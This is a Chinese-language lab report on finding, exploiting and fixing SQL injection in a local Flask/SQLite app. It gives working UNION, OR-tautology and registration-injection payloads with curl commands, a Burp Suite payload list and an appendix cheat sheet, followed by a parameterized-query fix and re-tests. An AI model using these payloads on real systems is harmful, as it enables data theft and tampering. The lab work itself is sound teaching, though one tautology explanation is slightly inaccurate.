# 🧪 SQL 注入漏洞实验报告

> **实验名称：** SQL 注入漏洞的发现、利用与修复  
> **实验平台：** Flask 用户信息管理系统（Class01）  
> **实验日期：** 2026-07-19  
> **实验环境：** Kali Linux / Python 3.13 / SQLite / Burp Suite Community  

---

## 📑 目录

- [一、实验目的](#一实验目的)
- [二、实验环境](#二实验环境)
- [三、预备知识](#三预备知识)
- [四、漏洞原理分析](#四漏洞原理分析)
- [五、实验步骤](#五实验步骤)
  - [步骤 1：搭建实验环境](#步骤-1搭建实验环境)
  - [步骤 2：确认正常功能](#步骤-2确认正常功能)
  - [步骤 3：SQL 注入测试（POC）](#步骤-3sql-注入测试poc)
  - [步骤 4：Burp Suite 自动化注入](#步骤-4burp-suite-自动化注入)
  - [步骤 5：漏洞修复](#步骤-5漏洞修复)
  - [步骤 6：修复后验证](#步骤-6修复后验证)
- [六、实验结果汇总](#六实验结果汇总)
- [七、思考与拓展](#七思考与拓展)

---

## 一、实验目的

1. 理解 SQL 注入漏洞产生的根本原因
2. 掌握 SQL 注入的三种常见利用方式（UNION 注入、OR 注入、注册注入）
3. 学会使用 Burp Suite 进行注入测试
4. 掌握使用**参数化查询**修复 SQL 注入漏洞的正确方法

---

## 二、实验环境

### 2.1 软硬件环境

| 项目 | 配置 |
|------|------|
| 操作系统 | Kali Linux 2026 |
| Python | 3.13 |
| Web 框架 | Flask 3.x |
| 数据库 | SQLite 3 |
| 抓包工具 | Burp Suite Community Edition |
| 目标应用 | 用户管理系统 (127.0.0.1:5000) |

### 2.2 网络拓扑

```
┌───────────────────────┐         ┌──────────────────────────┐
│   攻击者（本机）       │         │   目标服务器（本机）       │
│                       │ HTTP    │                          │
│  Burp Suite ──────────┼────────►│  Flask App               │
│  curl / 浏览器        │         │  127.0.0.1:5000          │
│                       │         │  ┌──────────────────┐   │
│                       │         │  │  SQLite 数据库    │   │
│                       │         │  │  data/users.db   │   │
│                       │         │  └──────────────────┘   │
└───────────────────────┘         └──────────────────────────┘
```

---

## 三、预备知识

### 3.1 什么是 SQL 注入？

SQL 注入（SQL Injection）是指攻击者通过在用户输入中插入恶意的 SQL 代码，欺骗后端数据库执行非预期的命令。

**核心原因：** 用户输入被当作 SQL 代码（而非数据）拼接到了 SQL 语句中。

### 3.2 SQL 语句的两部分

```sql
SELECT * FROM users WHERE username = 'admin'
├───────────── SQL 代码 ─────────────┤├──┤
                                     │  └── 数据（用户输入的值）
                                     └── 数据边界（单引号）
```

**正常情况**：用户输入 `admin`，作为数据与 SQL 代码拼接
**注入情况**：用户输入 `' OR '1'='1`，单引号闭合了数据边界，改变了 SQL 结构

### 3.3 参数化查询 vs 字符串拼接

```
┌─────────────────────────────────────────────────────────┐
│                   字符串拼接（危险）                      │
│                                                         │
│  "SELECT * FROM users WHERE name = '" + input + "'"     │
│                                         └───────┬───────┘│
│                                            直接嵌入代码  │
│  输入 "admin" → SELECT * FROM users WHERE name = 'admin' │
│  输入 "' OR '1'='1" → WHERE name = '' OR '1'='1'  ← 注入│
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│                   参数化查询（安全）                      │
│                                                         │
│  "SELECT * FROM users WHERE name = ?"                   │
│                                      └────┬────┘        │
│                                      占位符（模板）      │
│  先编译 SQL 确定结构，再传入参数                          │
│  输入 "' OR '1'='1" → 当作普通字符串去 LIKE 匹配         │
│  → 不会改变 SQL 结构                                     │
└─────────────────────────────────────────────────────────┘
```

---

## 四、漏洞原理分析

### 4.1 漏洞位置

本次实验在以下两个位置存在 SQL 注入漏洞：

```
文件: app.py
漏洞 1: /register 路由（第 271-311 行）
漏洞 2: /search 路由（第 316-361 行）
```

### 4.2 注册功能漏洞代码

```python
# app.py — 修复前的注册路由

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        email = request.form.get("email", "").strip()
        phone = request.form.get("phone", "").strip()

        # ⚠️ 危险：使用 f-string 直接拼接用户输入
        sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
        cursor.execute(sql)   # ← 用户输入中的 ' 会改变 SQL 结构！
```

> 📸 **截图建议：** 截取 `app.py` 中 `/register` 路由的代码，高亮标记 `sql = f"..."` 这一行和 `cursor.execute(sql)` 这一行。

### 4.3 搜索功能漏洞代码

```python
# app.py — 修复前的搜索路由

@app.route("/search")
def search():
    keyword = request.args.get("keyword", "")
    
    # ⚠️ 危险：用户输入直接拼接进 LIKE 查询
    sql = f"SELECT id, username, email, phone FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
    cursor.execute(sql)   # ← keyword 中的 ' 会闭合 LIKE 的引号！
```

> 📸 **截图建议：** 截取 `/search` 路由代码，高亮标记 f-string 拼接 SQL 那一行。

### 4.4 字符串拼接导致 SQL 注入的原理

**正常搜索：**

```sql
用户输入: admin

生成的 SQL:
SELECT id, username, email, phone FROM users
WHERE username LIKE '%admin%' OR email LIKE '%admin%'
                      └────┬───┘
                           └── admin 作为数据，安全的
```

**注入搜索：**

```sql
用户输入: ' OR '1'='1

生成的 SQL:
SELECT id, username, email, phone FROM users
WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'
                      ^^^^^^^^^^^^^
                      │
                      └── 单引号闭合了 LIKE 的字符串
                          OR 添加了永真条件 '1'='1'
                          导致返回全部用户！
```

### 4.5 SQL 语句执行流程对比

```
┌──────────────────────────────────────────────────────────┐
│              修复前：字符串拼接的执行流程                   │
│                                                          │
│  步骤 1: 接收用户输入 "' OR '1'='1"                      │
│  步骤 2: 拼接到 SQL 模板                                 │
│          → "SELECT ... WHERE name LIKE '%' OR '1'='1%'"  │
│  步骤 3: 发送完整 SQL 字符串给 SQLite                      │
│  步骤 4: SQLite 解析 → 发现 OR 条件 → 返回全部数据！      │
│                                                          │
│  ★ 关键问题：用户输入在拼接时被当作 SQL 代码处理了          │
└──────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────┐
│              修复后：参数化查询的执行流程                   │
│                                                          │
│  步骤 1: 预编译 SQL 模板                                  │
│          → "SELECT ... WHERE name LIKE ?"                │
│          → SQL 结构已锁定，不能改变                        │
│  步骤 2: 传入参数 "' OR '1'='1"                          │
│  步骤 3: SQLite 将参数当作纯数据（字符串）填入             │
│          → 实际匹配的是名字为 "' OR '1'='1" 的用户        │
│          → 找不到，返回空                                 │
│                                                          │
│  ★ 关键区别：参数永远只是数据，不会参与 SQL 解析           │
└──────────────────────────────────────────────────────────┘
```

> 📸 **截图建议：** 可以用绘图工具（draw.io / Excalidraw）画一张「字符串拼接 vs 参数化查询」的对比流程图替换上面的 ASCII 图。

---

## 五、实验步骤

### 步骤 1：搭建实验环境

#### 1.1 启动目标应用

```bash
# 进入项目目录
cd /opt/Class01

# 清理旧数据库（重新开始）
rm -f data/users.db

# 启动 Flask 应用
python app.py
```

**预期输出：**

```
[DB] SQLite 数据库初始化完成 — data/users.db
 * Serving Flask app 'app'
 * Debug mode: on
 * Running on http://0.0.0.0:5000
```

> 📸 **截图建议：** 截取终端中 Flask 启动成功的输出，显示 `Running on http://0.0.0.0:5000`。

#### 1.2 验证数据库初始化

```bash
# 检查数据库是否正常创建
python -c "
import sqlite3
conn = sqlite3.connect('data/users.db')
rows = conn.execute('SELECT id, username, email FROM users').fetchall()
for r in rows:
    print(f'  [{r[0]}] {r[1]} - {r[2]}')
conn.close()
"
```

**预期输出：**

```
  [1] admin - admin@example.com
  [2] alice - alice@example.com
```

> 📸 **截图建议：** 截取数据库查询结果，显示 admin 和 alice 两个用户。

---

### 步骤 2：确认正常功能

#### 2.1 手动测试搜索

```bash
# 测试正常搜索
curl -s "http://127.0.0.1:5000/search?keyword=admin"
```

> 📸 **截图建议：** 在浏览器中访问 `http://127.0.0.1:5000/search?keyword=admin`，截取页面显示搜索结果（admin 用户信息的表格）。

**正常搜索结果：**

```
┌──────────────────────────────────┐
│  搜索结果：关键词 "admin"         │
│  ┌──────┬────────┬────────────┐  │
│  │ ID   │ 用户名 │ 邮箱        │  │
│  ├──────┼────────┼────────────┤  │
│  │ 1    │ admin  │ admin@...  │  │
│  └──────┴────────┴────────────┘  │
└──────────────────────────────────┘
```

#### 2.2 手动测试注册

```bash
# 注册一个新用户
curl -X POST http://127.0.0.1:5000/register \
  -d "username=test&password=123&email=test@t.com&phone=111"
```

> 📸 **截图建议：** 截取 Burp Suite 中该注册请求的 Repeater 界面，显示请求和响应（302 重定向到登录页）。

---

### 步骤 3：SQL 注入测试（POC）

#### 3.1 POC 1：UNION 注入获取任意数据

**攻击原理：**

UNION 关键字用于合并两个 SELECT 查询的结果。攻击者通过注入 `UNION SELECT`，可以在原始查询结果中追加自定义数据。

```sql
原始语句：
SELECT id, username, email, phone FROM users WHERE username LIKE '%{keyword}%'

注入后：
SELECT id, username, email, phone FROM users WHERE username LIKE '%'
UNION SELECT 1,'inj','inj@x.com','138'--%'
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
第二个查询返回：1, inj, inj@x.com, 138
这些数据会出现在搜索结果中！
```

**执行攻击：**

```bash
# URL 解码后的 payload: ' UNION SELECT 1,'inj','inj@x.com','138'--
curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj%40x.com%27,%27138%27--"
```

> 📸 **截图建议：**
> 1. 截取浏览器中搜索 `' UNION SELECT 1,'inj','inj@x.com','138'--` 后的页面，显示出现了 `inj` 用户名
> 2. 截取终端中 Flask 打印的 `[SQL]` 日志，显示生成的 SQL 语句

**攻击结果：**

```
┌──────────────────────────────────┐
│  搜索结果：关键词 "...UNION..."  │
│  ┌──────┬────────┬────────────┐  │
│  │ ID   │ 用户名 │ 邮箱        │  │
│  ├──────┼────────┼────────────┤  │
│  │ 1    │ admin  │ admin@...  │  │  ← 原始数据
│  ├──────┼────────┼────────────┤  │
│  │ 1    │ inj    │ inj@x.com  │  │  ← 注入数据！！
│  ├──────┼────────┼────────────┤  │
│  │ 2    │ alice  │ alice@...  │  │  ← 原始数据
│  └──────┴────────┴────────────┘  │
└──────────────────────────────────┘
```

**Flask 后台日志：**

```
[SQL] SELECT id, username, email, phone FROM users 
       WHERE username LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%' 
       OR email LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'
       ^^^^^^^^
       注入成功！UNION 查询被执行
```

#### 3.2 POC 2：OR 万能条件注入

**攻击原理：**

通过在 WHERE 条件中注入 `OR '1'='1'`（永真条件），使查询返回表中所有行，绕过任何条件过滤。

```sql
原始语句：
WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'

注入 keyword = ' OR '1'='1 后：
WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'
                      ^^^^^^^^^^^^^
                      注意这个永真条件！
                      username 没有匹配的结果
                      但 OR '1'='1' 永远为真
                      所以所有行都被返回
```

**执行攻击：**

```bash
# URL 解码后的 payload: ' OR '1'='1
curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271"
```

> 📸 **截图建议：**
> 1. 截取浏览器中搜索 `' OR '1'='1` 后的页面，显示返回了所有用户
> 2. 可以截取 Burp Suite Repeater 中请求参数和响应的对比

**攻击结果：**

```
┌──────────────────────────────────┐
│  搜索结果：关键词 "' OR '1'='1" │
│  ┌──────┬────────┬────────────┐  │
│  │ ID   │ 用户名 │ 邮箱        │  │
│  ├──────┼────────┼────────────┤  │
│  │ 1    │ admin  │ admin@...  │  │  ← 被泄露
│  ├──────┼────────┼────────────┤  │
│  │ 2    │ alice  │ alice@...  │  │  ← 被泄露
│  ├──────┼────────┼────────────┤  │
│  │ ...  │ 更多   │ ...        │  │  ← 所有用户都被泄露
│  └──────┴────────┴────────────┘  │
└──────────────────────────────────┘
```

#### 3.3 POC 3：注册功能 SQL 注入

**攻击原理：**

注册功能同样使用 f-string 拼接 SQL，攻击者可以在用户名中插入特殊字符，闭合 SQL 语句的结构，插入任意数据。

```sql
原始语句：
INSERT INTO users (username, password, email, phone)
VALUES ('{username}', '{password}', '{email}', '{phone}')

注入 username = hacker', 'pass', 'h@x.com', '123')-- 后：

INSERT INTO users (username, password, email, phone)
VALUES ('hacker', 'pass', 'h@x.com', '123')--', 'irrelevant', '', '')
                                          ^^
                                          -- 注释掉了后面的所有内容！
                                          实际插入的数据是 hacker / pass / h@x.com / 123
```

**执行攻击：**

```bash
curl -X POST http://127.0.0.1:5000/register \
  -d "username=hacker123', 'pass', 'h@x.com', '123')--&password=irrelevant"
```

> 📸 **截图建议：**
> 1. 截取终端中执行 curl 命令和执行后查询数据库的输出
> 2. 截取 Flask 后台打印的 `[SQL]` 日志，显示生成的注入 SQL 语句

**攻击结果 — 数据库泄露：**

```bash
# 查询数据库
python -c "
import sqlite3
conn = sqlite3.connect('data/users.db')
for r in conn.execute('SELECT id, username, email FROM users'):
    print(f'  [{r[0]}] {r[1]}')
conn.close()
"
```

```
  [1] admin
  [2] alice
  [5] hacker123          ← 攻击者成功插入数据！
```

#### 3.4 POC 总结表

| POC | 攻击向量 | 修复前结果 | 危害 |
|-----|---------|-----------|------|
| 1 | `' UNION SELECT ...` | 搜索结果出现 `inj` | 窃取任意数据 |
| 2 | `' OR '1'='1` | 返回全部用户 | 用户数据泄露 |
| 3 | 注册名含 SQL 代码 | 注入执行成功 | 数据库任意操作 |

---

### 步骤 4：Burp Suite 自动化注入

#### 4.1 配置 Burp Suite 代理

```bash
# 1. 启动 Burp Suite
burpsuite

# 2. 设置代理监听 127.0.0.1:8080

# 3. 配置浏览器或 curl 使用代理
export http_proxy=http://127.0.0.1:8080
export https_proxy=http://127.0.0.1:8080
```

> 📸 **截图建议：** 截取 Burp Suite Proxy → Options 界面，显示代理监听设置。

#### 4.2 拦截搜索请求

1. 浏览器访问 `http://127.0.0.1:5000/search?keyword=admin`
2. Burp Suite 拦截到请求

> 📸 **截图建议：** 截取 Burp Suite Proxy → Intercept 界面，显示拦截到的 GET 请求，`keyword=admin` 参数高亮。

#### 4.3 发送到 Repeater 测试

1. 右键拦截的请求 → Send to Repeater
2. 在 Repeater 中修改 `keyword` 参数值

> 📸 **截图建议：** 截取 Burp Suite Repeater 界面，显示修改后的参数和响应结果。

**Repeater 测试序列：**

```
测试 1:
  GET /search?keyword=admin' OR '1'='1
  → 应返回所有用户           ← 注入成功标志

测试 2:
  GET /search?keyword=' UNION SELECT 1,2,3,4--
  → 响应中可能出现数字 1,2,3,4  ← 确认列数

测试 3:
  GET /search?keyword=' UNION SELECT 1,username,email,phone FROM users--
  → 显示所有用户名和邮箱       ← 数据窃取成功
```

#### 4.4 Intruder 批量测试

1. 发送请求到 Intruder
2. 设置 `keyword` 为 Payload 位置
3. 加载 SQL 注入 Payload 字典

> 📸 **截图建议：** 截取 Burp Suite Intruder Positions 界面，显示 `§keyword§` 标记。

**常用注入 Payload 列表：**

```
'
' OR '1'='1
' OR 1=1--
' UNION SELECT 1,2,3,4--
' UNION SELECT 1,username,email,phone FROM users--
admin'--
admin'--
```

---

### 步骤 5：漏洞修复

#### 5.1 修复注册路由

```diff
  # app.py — /register 路由修复
  
  if request.method == "POST":
      username = request.form.get("username", "").strip()
      ...
  
-     # ❌ 修复前：f-string 字符串拼接（存在注入）
-     sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
-     cursor.execute(sql)
+     # ✅ 修复后：参数化查询（使用 ? 占位符）
+     sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
+     cursor.execute(sql, (username, password, email, phone))
```

**修复前后对比：**

```sql
-- 输入 username = admin
-- 输入 password = 123456

-- ❌ 修复前（字符串拼接）
INSERT INTO users (...) VALUES ('admin', '123456', '', '')   ← 正常

-- ✅ 修复后（参数化查询）
INSERT INTO users (...) VALUES (?, ?, ?, ?)                   ← SQL 模板固定
参数: ('admin', '123456', '', '')                             ← 数据分离

--------------------------------------------------------------

-- 输入 username = hacker', 'pass', 'h@x.com', '123')--
-- 输入 password = irrelevant

-- ❌ 修复前（字符串拼接）
INSERT INTO users (...) VALUES ('hacker', 'pass', 'h@x.com', '123')--', ...)
                                          ← SQL 结构被改变！注入成功！

-- ✅ 修复后（参数化查询）
INSERT INTO users (...) VALUES (?, ?, ?, ?)                   ← SQL 结构不变！
参数: ("hacker', 'pass', 'h@x.com', '123')--", 'irrelevant', '', '')
                                          ← 整段被当作一个字符串值！
```

> 📸 **截图建议：** 截取修复前后代码对比截图（可以使用 VS Code 的 diff 视图），左侧显示旧代码，右侧显示新代码。

#### 5.2 修复搜索路由

```diff
  # app.py — /search 路由修复
  
  keyword = request.args.get("keyword", "")
  
-     # ❌ 修复前：f-string 字符串拼接（存在注入）
-     sql = f"SELECT id, username, email, phone FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
-     cursor.execute(sql)
+     # ✅ 修复后：参数化查询（通配符 % 放在参数值中）
+     like_pattern = f"%{keyword}%"
+     sql = "SELECT id, username, email, phone FROM users WHERE username LIKE ? OR email LIKE ?"
+     cursor.execute(sql, (like_pattern, like_pattern))
```

**⚠️ 注意事项：**

```sql
-- ❌ 错误写法：占位符放在引号内
WHERE username LIKE '?%'     ← SQLite 把 ? 当作字符 '?'，不是参数！

-- ✅ 正确写法：占位符独立，% 放在参数值中
WHERE username LIKE ?        ← SQLite 识别 ? 为参数占位符
参数: '%admin%'              ← % 在参数值中，安全
```

#### 5.3 修复后的完整代码

```python
# === 修复后的注册路由 ===
@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # ✅ 参数化查询
        sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
        cursor.execute(sql, (username, password, email, phone))
        conn.commit()
        conn.close()
        
        return redirect("/login?registered=1")


# === 修复后的搜索路由 ===
@app.route("/search")
def search():
    keyword = request.args.get("keyword", "")
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # ✅ 参数化查询
    like_pattern = f"%{keyword}%"
    sql = "SELECT id, username, email, phone FROM users WHERE username LIKE ? OR email LIKE ?"
    cursor.execute(sql, (like_pattern, like_pattern))
    
    rows = cursor.fetchall()
    conn.close()
```

> 📸 **截图建议：** 截取修复后完整的 `/register` 和 `/search` 路由代码。

---

### 步骤 6：修复后验证

#### 6.1 POC 1 重测（UNION 注入）

```bash
# 重新执行 UNION 注入
curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj%40x.com%27,%27138%27--"
```

> 📸 **截图建议：** 截取修复后搜索 UNION 注入 payload 的页面，显示"无搜索结果"。

**修复前：** ✅ 注入成功，页面显示 `inj` / `inj@x.com`
**修复后：** ❌ 注入失败，页面显示 `无搜索结果`

```
┌──────────────────────────────────┐
│  搜索结果：关键词 "' UNION..."   │
│                                  │
│          无搜索结果              │  ← UNION 注入被拦截！
│                                  │
└──────────────────────────────────┘
```

#### 6.2 POC 2 重测（OR 注入）

```bash
curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271"
```

**修复前：** ✅ 返回全部用户（admin, alice, ...）
**修复后：** ❌ 显示"无搜索结果"

#### 6.3 POC 3 重测（注册注入）

```bash
curl -X POST http://127.0.0.1:5000/register \
  -d "username=hacker_fix', 'pass', 'h@x.com', '123')--&password=irrelevant"
```

**修复前：** ✅ 注入的 SQL 被执行
**修复后：** ❌ 特殊字符被当作普通用户名，原样存入数据库

```bash
# 验证数据库中该用户的实际用户名
python -c "
import sqlite3
conn = sqlite3.connect('data/users.db')
for r in conn.execute('SELECT username FROM users WHERE username LIKE \"%hacker%\"'):
    print(repr(r[0]))
conn.close()
"
```

**输出：**
```
"hacker_fix', 'pass', 'h@x.com', '123')--"
```
← 整段注入语句被原样当作用户名存储，注入未执行！

> 📸 **截图建议：** 截取数据库查询结果，显示注入语句被当作普通字符串存储。

---

## 六、实验结果汇总

### 6.1 修复前后对比表

| 测试项 | 修复前（v2.1） | 修复后（v2.2） | 说明 |
|--------|---------------|---------------|------|
| 正常搜索 `admin` | ✅ 正常 | ✅ 正常 | 功能正常 |
| POC 1: UNION 注入 | ✅ **注入成功** `inj` 出现 | ✅ **拦截成功**"无搜索结果" | 参数化查询阻止了 UNION |
| POC 2: OR 注入 | ✅ **注入成功** 返回全部用户 | ✅ **拦截成功**"无搜索结果" | 输入被当作字符串匹配 |
| POC 3: 注册注入 | ✅ **注入成功** 插入定制数据 | ✅ **拦截成功** 整段当用户名 | SQL 结构未改变 |
| 正常注册 | ✅ 正常 | ✅ 正常 | 功能正常 |

### 6.2 攻击链防御效果

```
攻击者
   │
   ├─→ 步骤1: 尝试 UNION 注入窃取数据
   │     └─→ 参数化查询将 UNION 当作普通字符串 LIKE 匹配
   │         └─→ 匹配不到，返回空结果  ✅ 拦截
   │
   ├─→ 步骤2: 尝试 OR 万能条件绕过
   │     └─→ 所有特殊字符被转义为字符串值
   │         └─→ 搜索的是名字为 "' OR '1'='1" 的用户
   │             └─→ 不存在，返回空  ✅ 拦截
   │
   └─→ 步骤3: 尝试注册时注入 SQL
         └─→ 参数化查询固定了 INSERT 结构
             └─→ 注入语句被当作用户名存入
                 └─→ 未执行任何 SQL 代码  ✅ 拦截
```

### 6.3 安全收益

```
注入成功率: 100% ──────────────────────────────→ 0%
                \                              /
                 \                            /
                  🅇  参数化查询屏障  🅇
                   \                      /
                    ▼                    ▼
             数据泄露风险              数据安全
             CVSS 9.8                 风险消除
```

---

## 七、思考与拓展

### 7.1 为什么参数化查询能防住所有注入？

```
┌──────────────────────────────────────────────────────────────┐
│                    参数化查询的本质                            │
│                                                              │
│  传统思路：先组装 SQL 语句 → 再解析执行                        │
│            "SELECT ... WHERE name = '" + input + "'"          │
│            这一步输入已经和代码混在一起了！                      │
│                                                              │
│  参数化查询：先预编译 SQL 模板 → 再传入参数                     │
│            "SELECT ... WHERE name = ?"  ← 模板已固定           │
│            传入参数: (input,)            ← 参数纯数据           │
│                                                              │
│  ★ SQL 解析只发生一次，在传入参数之前                           │
│  ★ 无论参数里有什么特殊字符，都不会被当作 SQL 代码              │
└──────────────────────────────────────────────────────────────┘
```

### 7.2 其他防御措施（纵深防御）

| 层次 | 防御措施 | 说明 |
|------|---------|------|
| **代码层** | 参数化查询 | ✅ 已实施，最核心的防御 |
| **代码层** | ORM 框架（SQLAlchemy） | 进一步抽象 SQL，减少手写 SQL |
| **输入层** | 输入验证 | 限制用户名只能包含字母数字 |
| **数据库层** | 最小权限原则 | 应用账号只赋予 INSERT/SELECT 权限 |
| **数据库层** | WAF | Web 应用防火墙拦截恶意 Payload |
| **监控层** | SQL 审计日志 | 记录所有 SQL 执行，异常时告警 |

### 7.3 常见误区

| 误区 | 正确理解 |
|------|---------|
| "过滤单引号就够了" | ❌ 不同数据库的转义规则不同，总有遗漏 |
| "用参数化查询就没必要输入验证了" | ✅ 参数化查防治注入，输入验证防治其他攻击（XSS） |
| "ORM 一定比手写 SQL 安全" | ORM 默认安全，但 `raw_query()` 仍然有注入风险 |
| "存储过程可以防注入" | ❌ 存储过程内部如果使用拼接 SQL 同样有注入风险 |

---

## 附录

### A. 常用 SQL 注入 Payload 速查表

```
# 检测注入点
'                                 → 数据库报错
"                                 → 数据库报错
' OR '1'='1                       → 永真条件
' OR 1=1--                        → 永真条件（注释符）
' AND 1=1--                       → 永真 + 注释

# 列数探测
' ORDER BY 1--                    → 正常
' ORDER BY 2--                    → 正常
' ORDER BY 3--                    → 正常
' ORDER BY 4--                    → 正常（已知是4列）
' ORDER BY 5--                    → 报错 → 确认最多4列

# UNION 注入
' UNION SELECT 1,2,3,4--          → 测试列数
' UNION SELECT 1,username,email,phone FROM users--  → 窃取数据

# 读取 SQLite 元数据
' UNION SELECT 1,name,sql,4 FROM sqlite_master--  → 读取所有表结构
```

### B. 修复前后 SQL 对比卡

```sql
-- ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
--  修复前：字符串拼接（危险）
-- ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

-- 注册
INSERT INTO users VALUES ('{用户输入}', '{密码}', ...)

-- 搜索
SELECT * FROM users WHERE username LIKE '%{用户输入}%'

-- ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
--  修复后：参数化查询（安全）  
-- ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

-- 注册
INSERT INTO users VALUES (?, ?, ?, ?)
参数: (用户输入, 密码, ...)

-- 搜索
SELECT * FROM users WHERE username LIKE ? OR email LIKE ?
参数: (%输入%, %输入%)
```

---

> **📌 截图完成清单：**
>
> | # | 截图内容 | 已截取 |
> |---|---------|--------|
> | 1 | Flask 启动成功界面 | ☐ |
> | 2 | 代码中 f-string 拼接位置 | ☐ |
> | 3 | 正常搜索 admin 结果页 | ☐ |
> | 4 | POC 1 UNION 注入成功结果 | ☐ |
> | 5 | Flask 后台打印的注入 SQL 日志 | ☐ |
> | 6 | POC 2 OR 注入返回全部用户 | ☐ |
> | 7 | POC 3 注册注入后数据库内容 | ☐ |
> | 8 | Burp Suite Repeater 界面 | ☐ |
> | 9 | 修复后 POC 1 显示"无搜索结果" | ☐ |
> | 10 | 修复后数据库查询结果 | ☐ |

---

*实验完成时间：2026-07-19 | 实验人：Class01 安全测试团队*
